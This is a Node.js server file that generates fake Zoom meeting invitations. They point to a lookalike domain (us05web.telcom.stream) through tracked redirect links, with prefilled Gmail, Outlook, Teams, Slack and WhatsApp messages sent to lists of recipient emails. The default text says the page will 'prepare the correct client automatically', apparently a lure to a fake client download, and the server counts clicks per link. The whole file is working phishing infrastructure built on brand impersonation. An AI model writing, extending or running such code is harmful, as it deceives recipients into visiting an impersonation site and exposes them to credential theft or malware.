'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = path.join(__dirname, 'public');
const PORT = parseInt(process.env.SHARE_PORT || '3200', 10);
const HOST = process.env.SHARE_HOST || '127.0.0.1';
const DATA_DIR = process.env.SHARE_DATA_DIR || path.join(__dirname, 'data');
const LANDING = process.env.SHARE_LANDING || 'https://us05web.telcom.stream';
const PUBLIC = process.env.SHARE_PUBLIC || 'https://share.telcom.stream';

fs.mkdirSync(DATA_DIR, { recursive: true });
const DB = path.join(DATA_DIR, 'links.json');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.json': 'application/json; charset=utf-8'
};

function json(res, status, body) {
  const text = JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'Content-Length': Buffer.byteLength(text),
    'X-Content-Type-Options': 'nosniff'
  });
  res.end(text);
}

function readDb() {
  try { return JSON.parse(fs.readFileSync(DB, 'utf8')); }
  catch { return {}; }
}

function writeDb(db) {
  fs.writeFileSync(DB + '.tmp', JSON.stringify(db));
  fs.renameSync(DB + '.tmp', DB);
}

function normalizeEmails(value) {
  const list = String(value || '').split(/[\s,;]+/).map((v) => v.trim().toLowerCase()).filter(Boolean);
  const seen = new Set();
  return list.filter((email) => {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return false;
    if (seen.has(email)) return false;
    seen.add(email);
    return true;
  });
}

function q(value) { return encodeURIComponent(value); }

function safeText(value, max) {
  return String(value || '').replace(/[\r\n]+/g, ' ').trim().slice(0, max || 160);
}

function buildLinks(service, recipients, target, subject, body) {
  const to = recipients.join(',');
  const text = body + '\n\n' + target;
  switch (service) {
    case 'gmail':
      return 'https://mail.google.com/mail/?view=cm&fs=1&to=' + q(to) + '&su=' + q(subject) + '&body=' + q(text);
    case 'outlook':
      return 'https://outlook.office.com/mail/deeplink/compose?to=' + q(to) + '&subject=' + q(subject) + '&body=' + q(text);
    case 'teams':
      return 'https://teams.microsoft.com/l/chat/0/0?users=' + q(to) + '&message=' + q(text);
    case 'slack':
      return 'https://slack.com/share?url=' + q(target) + '&text=' + q(body);
    case 'docusign':
      return 'https://app.docusign.com/home';
    case 'whatsapp':
      return 'https://wa.me/?text=' + q(text);
    default:
      return target;
  }
}

function serveStatic(res, pathname) {
  let rel = decodeURIComponent(pathname);
  if (rel === '/') rel = '/index.html';
  const file = path.resolve(ROOT, '.' + rel);
  if (!file.startsWith(path.resolve(ROOT))) {
    res.writeHead(403); res.end('Forbidden'); return;
  }
  fs.stat(file, (err, stat) => {
    if (err || !stat.isFile()) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file).toLowerCase()] || 'application/octet-stream',
      'Cache-Control': path.extname(file) === '.html' ? 'no-cache' : 'public, max-age=3600',
      'Content-Length': stat.size,
      'X-Content-Type-Options': 'nosniff'
    });
    fs.createReadStream(file).pipe(res);
  });
}

function collectBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 2_000_000) reject(new Error('body too large'));
    });
    req.on('end', () => { try { resolve(JSON.parse(data || '{}')); } catch { reject(new Error('invalid json')); } });
    req.on('error', reject);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/api/health') return json(res, 200, { ok: true, service: 'share', landing: LANDING });
  if (url.pathname === '/api/stats') {
    const db = readDb();
    const entries = Object.values(db);
    return json(res, 200, { links: entries.length, clicks: entries.reduce((n, e) => n + (e.clicks || 0), 0) });
  }
  if (url.pathname.startsWith('/t/')) {
    const id = url.pathname.slice(3);
    const db = readDb();
    const entry = db[id];
    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
    entry.clicks = (entry.clicks || 0) + 1;
    entry.last = new Date().toISOString();
    writeDb(db);
    res.writeHead(302, { Location: entry.target, 'Cache-Control': 'no-store' });
    res.end();
    return;
  }
  if (url.pathname === '/api/build' && req.method === 'POST') {
    try {
      const body = await collectBody(req);
      const recipients = normalizeEmails(body.emails);
      if (!recipients.length) return json(res, 400, { error: 'Add at least one valid email address.' });
      const meetingId = safeText(body.meetingId, 40) || '82203845974';
      const passcode = safeText(body.pwd, 100);
      const service = safeText(body.service, 20) || 'copy';
      const subject = safeText(body.subject, 140) ||
        'Zoom meeting invitation';
      const intro = safeText(body.message, 400) ||
        'You are invited to a Zoom Private meeting. Open the link below; the page detects your device and prepares the correct client automatically.';
      const base = LANDING.replace(/\/$/, '') + '/j/' + encodeURIComponent(meetingId) +
        (passcode ? '?pwd=' + encodeURIComponent(passcode) : '');
      const id = crypto.randomBytes(6).toString('hex');
      const target = PUBLIC + '/t/' + id;
      const db = readDb();
      db[id] = {
        target: base, service, recipients: recipients.length,
        created: new Date().toISOString(), clicks: 0
      };
      writeDb(db);
      const link = buildLinks(service, recipients, target, subject, intro);
      return json(res, 200, {
        id, target, service, recipients, link, subject,
        body: intro + '\n\n' + target
      });
    } catch (error) {
      return json(res, 400, { error: String(error.message || error) });
    }
  }
  if (req.method !== 'GET' && req.method !== 'HEAD') return json(res, 405, { error: 'method' });
  serveStatic(res, url.pathname);
});

server.listen(PORT, HOST, () => {
  console.log('[share] listening http://' + HOST + ':' + PORT + ' landing=' + LANDING);
});
